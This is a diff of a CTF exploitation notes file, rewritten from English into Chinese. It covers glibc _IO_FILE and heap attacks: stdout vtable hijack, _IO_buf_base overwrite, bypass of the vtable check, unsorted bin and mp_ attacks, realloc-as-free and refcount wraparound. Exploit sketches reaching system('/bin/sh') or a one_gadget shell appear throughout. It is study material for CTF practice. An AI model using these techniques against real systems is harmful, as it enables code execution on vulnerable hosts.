@@ -1,279 +1,216 @@
-# CTF Pwn - Heap FILE Structure Attacks
-
-FILE-structure (_IO_FILE) exploitation for libc 2.23-2.27+: fastbin→stdout vtable hijack, _IO_buf_base null byte overwrites, glibc 2.24+ vtable validation bypass, unsorted-bin attacks on FILE fields, and menu-driven UAF / refcount bugs that land through these FILE primitives. For classical heap attacks (House of *, unlink, tcache, musl), see [[binary/漏洞利用/heap-techniques.md|heap-techniques.md]].
-
-## Table of Contents
-- [Fastbin stdout Vtable Two-Stage Hijack for PIE + Full RELRO (ASIS CTF 2017)](#fastbin-stdout-vtable-two-stage-hijack-for-pie--full-relro-asis-ctf-2017)
-- [_IO_buf_base Null Byte Overwrite for stdin Hijack (Tokyo Westerns 2017)](#_io_buf_base-null-byte-overwrite-for-stdin-hijack-tokyo-westerns-2017)
-- [glibc 2.24+ _IO_FILE Vtable Validation Bypass (HITCON 2017)](#glibc-224-_io_file-vtable-validation-bypass-hitcon-2017)
-- [Unsorted Bin Attack on stdin _IO_buf_end (HITCON 2017)](#unsorted-bin-attack-on-stdin-_io_buf_end-hitcon-2017)
-- [Unsorted Bin Corruption via mp_ Structure (HITCON 2017)](#unsorted-bin-corruption-via-mp_-structure-hitcon-2017)
-- [realloc(ptr, 0) as free() for UAF (AceBear 2018)](#reallocptr-0-as-free-for-uaf-acebear-2018)
-- [Single-Byte Reference Counter Wraparound to UAF (WhiteHat Grand Prix 2018)](#single-byte-reference-counter-wraparound-to-uaf-whitehat-grand-prix-2018)
-
 ---
 
-## Fastbin stdout Vtable Two-Stage Hijack for PIE + Full RELRO (ASIS CTF 2017)
+phase: binary
+vuln_class: [pwn, heap, io-file, uaf]
+title: FILE 结构体与堆利用
+summary: GOT 被 Full RELRO 锁死后，改 libc 的 _IO_FILE 结构。判据是「有没有 FILE 结构可落点、glibc 版本决定 vtable 校验强度」。
+---
 
-**Pattern:** When PIE and Full RELRO block GOT overwrite, target libc's stdout FILE structure via fastbin attack, using a two-stage vtable hijack.
+# FILE 结构体与堆利用
+
+经典堆手法（House of *、unlink、tcache、musl heap）见 [[binary/漏洞利用/heap-techniques.md|堆利用]]；UAF 与同尺寸复用见 [[binary/漏洞利用/advanced.md|Pwn 进阶]]；堆布局与自定义分配器见 [[binary/漏洞利用/heap-techniques.md|堆利用]]。
+
+## 0. 判据速查
+
+| 前提条件 | 手法 | 去哪节 |
+|---|---|---|
+| PIE + Full RELRO（GOT 改不了） | fastbin 打 stdout vtable，两段式劫持 | §1 |
+| 有 off-by-one NULL 溢出 | 改 `_IO_buf_base` 最低字节，把输入缓冲搬进 FILE 结构 | §2 |
+| glibc ≥ 2.24（vtable 有范围校验） | 两跳间接调用绕过 `__IO_vtable_check` | §3 |
+| 有 unsorted bin 写机会 | 打 `stdin._IO_buf_end`，让 `scanf` 读到 libc 数据段 | §4 |
+| 需要更大可写空间 | 打 `mp_` 结构（`trim_threshold` 天然像 chunk size） | §5 |
+| 程序用 `realloc(ptr, size)` 且 size 可控 | size=0 等价 free，绕过正常删除路径 | §6 |
+| 结构体里有 `uint8_t` 引用计数 | 计数回绕，256 次 addref 后归零 | §7 |
+
+**总原则**：GOT 被锁 → 改 libc 的可写数据段。`_IO_FILE` 结构、`__malloc_hook`、`__free_hook`、`mp_` 都在那里。
+
+## 1. fastbin 打 stdout vtable（PIE + Full RELRO）
+
+**为什么可行**：libc 的 stdout 区域天然含 `0x7f` 字节，正好能当 `0x70` fastbin 的 size 字段，通过 fastbin 的大小校验。
 
 ```python
 from pwn import *
 
-# Stage 1: Fastbin double-free targeting fake chunk inside stdout
-# Use 0x7f byte in libc stdout region as fake chunk size (matches 0x70 fastbin)
-fake_chunk_addr = libc.sym['_IO_2_1_stdout_'] + 0x91  # contains 0x7f byte
+# 阶段 1：double-free 把 fastbin 指向 stdout 里的假 chunk
+fake_chunk = libc.sym['_IO_2_1_stdout_'] + 0x91   # 这里有 0x7f 字节
 
-# Double-free in 0x70 fastbin
-alloc_a = malloc(0x60)
-alloc_b = malloc(0x60)
-free(alloc_a)
-free(alloc_b)
-free(alloc_a)  # double-free: fastbin 0x70 = [a -> b -> a]
+a = malloc(0x60)
+b = malloc(0x60)
+free(a); free(b); free(a)          # 0x70 fastbin: a -> b -> a
 
-# Redirect fastbin to stdout region
-malloc(0x60, p64(fake_chunk_addr))  # a's fd -> fake chunk in stdout
-malloc(0x60)                         # returns b
-malloc(0x60)                         # returns a again
+malloc(0x60, p64(fake_chunk))      # a->fd 指向假 chunk
+malloc(0x60)                       # 返回 b
+malloc(0x60)                       # 返回 a
 
-# Stage 2a: First vtable overwrite → gets()
-# rdi points to stdout struct, so gets(stdout) reads input into stdout
-fake_stdout_chunk = malloc(0x60)     # returns fake chunk overlapping stdout
-write_to(fake_stdout_chunk, p64(gets_addr))  # vtable → gets
+# 阶段 2a：第一次改 vtable → gets()
+# rdi 就是 stdout 的 FILE*，所以 gets(stdout) 会把输入读进 stdout 结构
+fake = malloc(0x60)                # 返回与 stdout 重叠的假 chunk
+write_to(fake, p64(gets_addr))
 
-# Stage 2b: gets() overwrites stdout vtable again → system()
-# Next puts() call triggers: vtable lookup → gets(stdout)
-# gets() reads from stdin into the stdout struct, overwriting vtable again
-# Input: "1\x80;/bin/sh;" — new vtable points to system()
-# After gets() returns, next output call triggers system()
+# 阶段 2b：gets() 再改一次 vtable → system()
+# 输入 "1\x80;/bin/sh;"，新 vtable 指向 system()
+# gets() 返回后，下一次输出调用触发 system()
 ```
 
-**Key insight:** The 0x7f byte naturally present in libc's stdout region satisfies fastbin size validation for the 0x70 bin. Two-stage hijack: first redirect vtable to `gets()` (since rdi=stdout FILE*), then `gets()` reads a second vtable pointing to `system()` along with the command string. This technique works even with PIE + Full RELRO because it targets libc's writable data segment, not the GOT.
+**两段式的原因**：第一次只能改到 `gets`，因为 `rdi` 已经是 stdout 指针，`gets(stdout)` 天然把输入写进结构体。第二次才有机会把 vtable 改成任意地址，同时把 `/bin/sh` 一起写进去。
 
-**When to recognize:** Challenge has PIE + Full RELRO, with a heap UAF or double-free. The 0x7f byte in libc's FILE structures is a universal fastbin target. Check `_IO_2_1_stdout_` region for 0x7f bytes at aligned offsets suitable as fake chunk sizes.
+**识别**：PIE + Full RELRO + 堆上有 UAF/double-free。`_IO_2_1_stdout_` 附近对齐偏移处的 `0x7f` 是通用落点。
 
-**References:** ASIS CTF 2017
+## 2. `_IO_buf_base` 空字节覆写
 
----
+**形态**：off-by-one 的 NULL 溢出改掉 `stdin` 的 `_IO_buf_base` 最低字节。
 
-## _IO_buf_base Null Byte Overwrite for stdin Hijack (Tokyo Westerns 2017)
-
-**Pattern:** A null-byte (off-by-one) heap overflow corrupts the least significant byte of `_IO_buf_base` in stdin's `_IO_FILE` structure. This redirects the stdin input buffer pointer to `_short_buf` — a small internal buffer that lies within the FILE struct itself. Subsequent `scanf`/`fgets` calls then write attacker input directly into the FILE structure, enabling overwrite of `_IO_buf_base`/`_IO_buf_end` to arbitrary addresses for a full write primitive.
-
-**How it works:**
 ```c
-// Null byte overwrite targets _IO_buf_base's LSB
-// Before: _IO_buf_base = 0x7f...XX00  (points to heap input buffer)
-// After:  _IO_buf_base = 0x7f...0000  (points into FILE struct itself,
-//                                       landing near _short_buf)
-// Next scanf() / fgets() reads input into the FILE struct
-// Overwrite _IO_buf_base/_IO_buf_end fields with arbitrary addresses
-// Now stdin reads from attacker-controlled memory address
+// 改前：_IO_buf_base = 0x7f...XX00  → 指向堆上的输入缓冲
+// 改后：_IO_buf_base = 0x7f...0000  → 落进 FILE 结构本身，靠近 _short_buf
+// 下一次 scanf / fgets 把输入写进 FILE 结构字段
+// 于是可以改 _IO_buf_base / _IO_buf_end 为任意地址
+// 再下一次读：stdin 从任意地址读 → 任意写原语
 ```
 
-**Exploitation chain:**
 ```python
-# 1. Arrange heap: allocation immediately before stdin's _IO_buf_base
-#    (requires heap grooming so chunk is adjacent to FILE struct)
-
-# 2. Null-byte overflow: write one 0x00 byte past chunk boundary
-#    → corrupts _IO_buf_base LSB → points into FILE struct
-
-# 3. Next read (scanf/fgets): input written into FILE struct fields
-#    → overwrite _IO_buf_base = target_addr, _IO_buf_end = target_addr + size
-
-# 4. Next read: stdin reads from target_addr → arbitrary write primitive
-#    → overwrite __free_hook with system() or one_gadget
-
-# 5. Trigger: call a function that invokes free() with a controlled pointer
-#    → system("/bin/sh")
+# 1. 堆布局：让某个 chunk 紧邻 stdin 的 _IO_buf_base（需要 heap grooming）
+# 2. 空字节溢出：越过 chunk 边界写一个 0x00，改掉 _IO_buf_base 的 LSB
+# 3. 下一次 scanf/fgets：输入被写进 FILE 结构
+#    → 把 _IO_buf_base 改成目标地址，_IO_buf_end 改成 目标+size
+# 4. 下一次读：stdin 从目标地址读 → 任意写
+#    → 改 __free_hook 为 system 或 one_gadget
+# 5. 触发：调一个会用可控指针调 free() 的函数
 ```
 
-**Key insight:** Null-byte overflow into stdin's `_IO_buf_base` relocates the input buffer into the FILE structure itself, providing arbitrary write via standard I/O functions. The `_short_buf` field within the FILE struct is the natural landing target when the LSB is zeroed.
+**`_short_buf` 是天然落点**：`_IO_buf_base` 的最低字节被清零后，指针正好落进 FILE 结构内部靠近 `_short_buf` 的位置。
 
-**References:** Tokyo Westerns CTF 2017
+## 3. glibc 2.24+ vtable 校验绕过
 
----
+**问题**：glibc 2.24+ 会把 vtable 指针与 `_IO_vtables` 段比对，段外直接拒绝。
 
-## glibc 2.24+ _IO_FILE Vtable Validation Bypass (HITCON 2017)
+**绕过思路**：校验的是 vtable 地址范围，但**不校验间接调用链**。用两跳解引用跳到未校验的子函数。
 
-**Pattern:** glibc 2.24+ validates vtable pointers against the `_IO_vtables` section, rejecting pointers outside that range. Bypass: use unchecked sub-function entries reachable via two-hop dereference. Arrange two heap pointers 0x10 bytes apart (via unsorted bin fd/bk). The first pointer is set to `valid_vtable_addr - 0x18`; the second to `system()`. `_IO_flush_all_lockp` dereferences `*(addr + 0xd8) + 0x18`, landing in an unchecked sub-function that calls `*(addr + 0xe8)`.
-
-**How the two-hop bypass works:**
 ```c
-// _IO_flush_all_lockp calls:
+// _IO_flush_all_lockp 的调用：
 //   fp->vtable->_IO_overflow(fp)
-// With a valid vtable addr but offset trick:
-//   vtable[offset] → points to sub-function outside vtable validation
-//   sub-function dereferences further → calls system()
+// 用一个合法 vtable 地址 + 偏移技巧：
+//   vtable[offset] → 指向 vtable 段外的子函数
+//   子函数再解引用一次 → 调到 system()
 
-// Heap layout using unsorted bin fd/bk (0x10 apart):
-//   [heap + 0x00]: valid_vtable_addr - 0x18   (passes vtable check at offset 0xd8)
-//   [heap + 0x10]: system()                   (called via *(addr + 0xe8) dereference)
+// 堆布局（用 unsorted bin 的 fd/bk，天然相隔 0x10）：
+//   [heap + 0x00] = valid_vtable_addr - 0x18   （过 0xd8 偏移处的校验）
+//   [heap + 0x10] = system()                   （经 *(addr + 0xe8) 调用）
 ```
 
-**Setup:**
 ```python
-# Place two pointers 0x10 apart using unsorted bin fd/bk as write targets
-# unsorted bin attack: write main_arena+88 to target, leak heap/libc
-# Craft FILE struct with _flags = " sh\x00" for system() argument
-# Trigger exit() → _IO_flush_all_lockp → two-hop call → system("sh")
+# unsorted bin attack 把 main_arena+88 写到目标，泄漏 heap/libc
+# 构造 FILE 结构，_flags 设为 " sh\x00" 作为 system 的参数
+# 触发 exit() → _IO_flush_all_lockp → 两跳调用 → system("sh")
 ```
 
-**Key insight:** Vtable validation checks the address range but not indirect entries reachable via sub-functions — two-hop call chains bypass `__IO_vtable_check`. The fd/bk pointers of a chunk in the unsorted bin sit exactly 0x10 bytes apart, making them natural targets for the two adjacent pointer slots needed.
+**关键**：unsorted bin 里 chunk 的 `fd`/`bk` 恰好相隔 0x10，正好填满两跳需要的两个相邻指针槽。
 
-**References:** HITCON CTF 2017
+## 4. unsorted bin 打 `stdin._IO_buf_end`
 
----
+**形态**：off-by-one NULL 造重叠块 → 释放进 unsorted bin → 用 unsorted bin attack 改 `stdin._IO_buf_end` 为一个大 libc 地址 → 下一次 `scanf` 把数据读进 libc 数据段。
 
-## Unsorted Bin Attack on stdin _IO_buf_end (HITCON 2017)
-
-**Pattern:** An off-by-one NULL byte creates overlapping heap chunks. Free into the unsorted bin, then use the unsorted bin attack (corrupting `bk` of an unsorted bin chunk) to overwrite `_IO_buf_end` of stdin's FILE structure with a large libc address (main_arena+88). The next `scanf` call then reads attacker data into libc's stdin buffer region — enabling overwrite of `__malloc_hook` with a one_gadget.
-
-**Exploit chain:**
 ```python
-# 1. Off-by-one NULL: corrupt next chunk's PREV_INUSE, set prev_size
-#    → create overlapping chunks via heap consolidation
-
-# 2. Free victim into unsorted bin
+# 1. off-by-one NULL：改下一个块的 PREV_INUSE，设 prev_size
+#    → 堆合并造出重叠块
+# 2. 释放 victim 进 unsorted bin
 #    → victim->fd = main_arena+88, victim->bk = main_arena+96
-
-# 3. Unsorted bin attack: set victim->bk = &stdin._IO_buf_end - 0x10
-#    When malloc() removes victim from unsorted bin:
-#    → victim->bk->fd = victim   (writes heap address → _IO_buf_end)
-#    But for full attack: set bk = &target - 0x10 to write main_arena+88 there
-
-# 4. stdin._IO_buf_end is now a large value → next scanf reads huge input
-#    → attacker data written into libc stdin buffer region
-#    → __malloc_hook in that region gets overwritten with one_gadget
-
-# 5. Trigger: any malloc() call → __malloc_hook → one_gadget → shell
+# 3. unsorted bin attack：设 victim->bk = &stdin._IO_buf_end - 0x10
+#    malloc 把 victim 从 unsorted bin 摘除时：
+#    → victim->bk->fd = victim   （往 _IO_buf_end 写值）
+# 4. _IO_buf_end 变成很大的值 → 下一次 scanf 读入巨量数据
+#    → 数据落进 libc 的 stdin 缓冲区域
+#    → 该区域的 __malloc_hook 被 one_gadget 覆盖
+# 5. 触发：任意 malloc() → __malloc_hook → one_gadget
 ```
 
-**Key insight:** Unsorted bin attack on `_IO_buf_end` causes `scanf` to read from an attacker-controlled buffer region inside libc's data segment. Since `__malloc_hook` resides near the stdin buffer in libc, a single large read can overwrite it with a one_gadget address.
+**为什么有效**：`__malloc_hook` 就在 stdin 缓冲区附近，一次大读能顺带覆盖。
 
-**References:** HITCON CTF 2017
+## 5. `mp_` 结构当假 chunk
 
----
+**形态**：`mp_`（`malloc_par`）是 glibc 的全局结构，位于 unsorted bin 附近。它的 `trim_threshold` 字段是个大数值，**天然通过 unsorted bin 的 size 校验**。
 
-## Unsorted Bin Corruption via mp_ Structure (HITCON 2017)
-
-**Pattern:** glibc's `mp_` (`malloc_par`) global structure lies near the unsorted bin in libc's data segment. A heap overflow combined with unsorted bin corruption overwrites `mp_->bk` with an address inside `mp_`. The `mp_` structure contains fields that, when interpreted as a free chunk header, pass unsorted bin validation (`size < system_mem`). Allocating from this "chunk" grants write access inside `mp_`, enabling overwrite of `__malloc_hook`. Requires partial ASLR brute-force (1/16 chance) for the heap address alignment.
-
-**Why mp_ works:**
 ```c
-// mp_ layout (glibc 2.23, near unsorted bin in libc BSS):
-// struct malloc_par {
-//   unsigned long  trim_threshold;   // offset 0x00 — large value, passes size check
-//   unsigned long  top_pad;          // offset 0x08
-//   ...
-//   unsigned long  system_mem;       // offset 0x48 — must be > fake chunk size
-// };
-// mp_.trim_threshold interpreted as chunk size → satisfies unsorted bin checks
-// malloc from mp_-as-chunk returns memory overlapping mp_ fields
-// Write __malloc_hook offset within mp_ → control next malloc → one_gadget
+// glibc 2.23 的 mp_ 布局（在 libc BSS，靠近 unsorted bin）：
+//   offset 0x00: trim_threshold   大值，被当成 chunk size 时通过校验
+//   offset 0x08: top_pad
+//   offset 0x48: system_mem       必须 > 假 chunk 的 size
 ```
 
-**Exploitation:**
 ```python
-# Heap overflow: corrupt unsorted bin chunk's bk to point into mp_
-corrupted_bk = mp_addr + FAKE_CHUNK_OFFSET  # offset where size field looks valid
+# 堆溢出改 unsorted bin chunk 的 bk 指向 mp_ 内部
+corrupted_bk = mp_addr + FAKE_CHUNK_OFFSET
 
-# Trigger unsorted bin traversal: malloc() of appropriate size
-# → unsorted bin unlinks fake chunk at mp_
-# → returns pointer into mp_ data
-# Write one_gadget to __malloc_hook offset within returned chunk
-malloc(size)  # returns mp_+0x10
-write_to_result(one_gadget)  # overwrites __malloc_hook
-
-# Trigger: next malloc() → __malloc_hook → one_gadget → shell
+# 触发 unsorted bin 遍历
+# → 在 mp_ 处摘下假 chunk
+# → 返回指向 mp_ 内部的指针
+malloc(size)                 # 返回 mp_+0x10
+write_to_result(one_gadget)  # 覆盖 __malloc_hook
 ```
 
-**Key insight:** glibc's `mp_` global structure passes unsorted bin validation naturally — its `trim_threshold` field serves as a convincing fake chunk size. A fake free chunk planted via unsorted bin corruption there enables allocation directly into glibc metadata, bypassing the need for any heap-side fake chunk construction.
+**代价**：需要部分 ASLR 爆破（堆地址对齐，约 1/16 命中率）。
 
-**References:** HITCON CTF 2017
+## 6. `realloc(ptr, 0)` 当 free 用
 
----
-
-## realloc(ptr, 0) as free() for UAF (AceBear 2018)
-
-**Pattern:** `realloc(ptr, 0)` behaves like `free(ptr)` in many glibc versions, returning the chunk to the freelist while the application may retain the old pointer — creating a use-after-free.
-
-**How it works:**
 ```c
-// C standard says realloc(ptr, 0) is implementation-defined
-// In glibc: realloc(ptr, 0) calls free(ptr) and returns NULL
-// If the application doesn't check the return value:
+// C 标准说 realloc(ptr, 0) 是实现定义的
+// glibc 里：realloc(ptr, 0) 等价 free(ptr) 并返回 NULL
 void *ptr = malloc(0x80);
-ptr = realloc(ptr, 0);    // ptr is now NULL, chunk is freed
-// But if the app stores the old pointer separately:
+ptr = realloc(ptr, 0);      // ptr 变 NULL，块已释放
+// 但如果应用另存了旧指针：
 void *saved = ptr;
-ptr = realloc(ptr, 0);    // freed, but saved still points to freed chunk
-// saved is now a dangling pointer → UAF
+ptr = realloc(ptr, 0);      // 释放了，saved 仍指向已释放块 → UAF
 ```
 
-**Exploitation:**
 ```python
-from pwn import *
-
-# Step 1: Allocate a chunk
-add(0, 0x80, b"AAAA")  # chunk at index 0
-
-# Step 2: Trigger realloc with size 0
-# Internally calls realloc(ptr, 0) which frees the chunk
-edit(0, size=0)  # realloc(ptr, 0) = free(ptr)
-# ptr is now freed but the application still holds the pointer at index 0
-
-# Step 3: Allocate new chunk that reuses the freed memory
-add(1, 0x80, b"BBBB")  # gets the same address as freed chunk
-
-# Step 4: Read through original index 0 → reads attacker-controlled data from index 1
-# Or: write through index 0 to corrupt index 1's chunk
-view(0)  # UAF read — sees "BBBB" written by index 1
-```
-
-**Tcache variant (glibc 2.26+):**
-```python
-# realloc(ptr, 0) puts the chunk in the tcache bin
-# Subsequent malloc of the same size returns the same chunk
-# Double reference enables tcache poisoning:
-
 add(0, 0x80, b"AAAA")
-edit(0, size=0)           # free via realloc → tcache[0x90]
-add(1, 0x80, p64(target)) # reuse freed chunk, write fake fd pointer
-# If index 0 still references the chunk:
-edit(0, size=0)           # double-free via realloc → tcache poisoning
-add(2, 0x80, b"CCCC")    # returns freed chunk
-add(3, 0x80, payload)    # returns target address → arbitrary write
+edit(0, size=0)              # 内部 realloc(ptr,0) = free(ptr)，但索引 0 的指针还在
+add(1, 0x80, b"BBBB")        # 复用同一块
+view(0)                      # UAF 读，看到 "BBBB"
 ```
 
-**Key insight:** `realloc(ptr, 0)` is implementation-defined. In glibc, it frees the block and returns NULL. If the application doesn't check the return value or still uses the old pointer, this creates a UAF. Look for `realloc` calls where the size parameter is user-controlled — setting it to 0 triggers the free behavior without going through the application's normal delete/free path, potentially bypassing reference counting or pointer nullification in the delete handler.
+**tcache 变体（glibc 2.26+）**：
 
-**When to recognize:** Challenge uses `realloc` for resize operations and the size is user-controlled. The "edit" or "resize" functionality internally calls `realloc` — check if size=0 is handled specially or just passed through. Also check if the return value of `realloc` is used to update the stored pointer (if not, the old pointer becomes dangling).
+```python
+add(0, 0x80, b"AAAA")
+edit(0, size=0)              # free → tcache[0x90]
+add(1, 0x80, p64(target))    # 复用，写入假 fd
+edit(0, size=0)              # 再次 free → tcache poisoning
+add(2, 0x80, b"CCCC")        # 返回刚释放的块
+add(3, 0x80, payload)        # 返回 target → 任意写
+```
 
-**References:** AceBear 2018
+**识别**：程序用 `realloc` 做 resize 且 size 用户可控。重点看 **size=0 有没有被特殊处理**，以及 **`realloc` 的返回值有没有更新到存储指针** —— 没更新就是悬垂指针。
 
----
+## 7. 单字节引用计数回绕
 
-## Single-Byte Reference Counter Wraparound to UAF (WhiteHat Grand Prix 2018)
-
-**Pattern:** A struct stores its own reference count in a `uint8_t` field. The object is freed only when `refcount == 0`, but because the counter wraps at 256, calling the `addref()` path 256 times brings `refcount` back to zero while every outstanding handle still holds a live pointer. The next call to `release()` frees the object — all other handles become dangling.
-
-**Exploit sketch:**
 ```c
 struct Book {
-    uint8_t refcount;     // 1 byte — vulnerable
+    uint8_t refcount;      // 1 字节 —— 漏洞所在
     char title[32];
     void (*read)(struct Book*);
 };
-
-// 1. create(h0)                    refcount = 1
-// 2. dup(h0) → h1 ... h256         refcount wraps 1 → 2 → ... → 0
-// 3. release(h1)                   refcount = 255 (underflow) → object freed
-// 4. Heap reallocation fills the same chunk with attacker data
-// 5. read(h0)                      calls attacker-controlled vtable pointer
 ```
 
-**Key insight:** Any counter that guards lifetime must be wide enough to exceed the number of handles the program can create in one session. `uint8_t` refcounts are always a red flag — verify that the `addref` path either saturates (stays at 255) or uses a wider type. The exploit only needs 256 `addref` calls and one extra `release`, so even heavily rate-limited handle APIs remain reachable.
+```text
+1. create(h0)                 refcount = 1
+2. dup(h0) → h1 ... h256      refcount 从 1 递增，第 256 次回绕到 0
+3. release(h1)                refcount 减到 255（下溢）→ 对象被释放
+4. 堆重新分配填满同一块
+5. read(h0)                   调用攻击者控制的函数指针
+```
 
-**References:** WhiteHat Grand Prix 2018 — writeup 10809
+**判据**：任何守护生命周期的计数器，宽度必须大于程序一次会话内能创建的句柄数。`uint8_t` 引用计数一律可疑 —— 检查 `addref` 是饱和（停在 255）还是回绕。
+
+**只需要 256 次 addref 加一次 release**，即使接口有速率限制也够用。
+
+## 8. 纪律
+
+- **GOT 被锁就改 libc 数据段**。`_IO_FILE`、`__malloc_hook`、`__free_hook`、`mp_` 全在可写区。
+- **`0x7f` 字节是 fastbin 的万能钥匙**。libc 里大量指针的高位字节就是 `0x7f`，对齐位置可当 chunk size。
+- **glibc 2.24+ 只校验 vtable 地址范围，不校验间接调用**。两跳能跳出去。
+- **unsorted bin 的 fd/bk 相隔 0x10**，是天然的两个相邻指针槽。
+- **`_IO_buf_base` 最低字节清零后落进 FILE 结构内部**，`_short_buf` 是最近的落点。
+- **`realloc(ptr, 0)` 在 glibc 里就是 free**。检查返回值有没有被用上。
+- **`uint8_t` 引用计数必查**。宽度不够就是回绕型 UAF，代价只有 256 次调用。
+- **版本决定手法**。2.23 / 2.24-2.27 / 2.26+ tcache / 2.31+ 移除 hooks，每个分界的可用原语完全不同 —— 先 `libc.so.6` 确认版本再选手法。
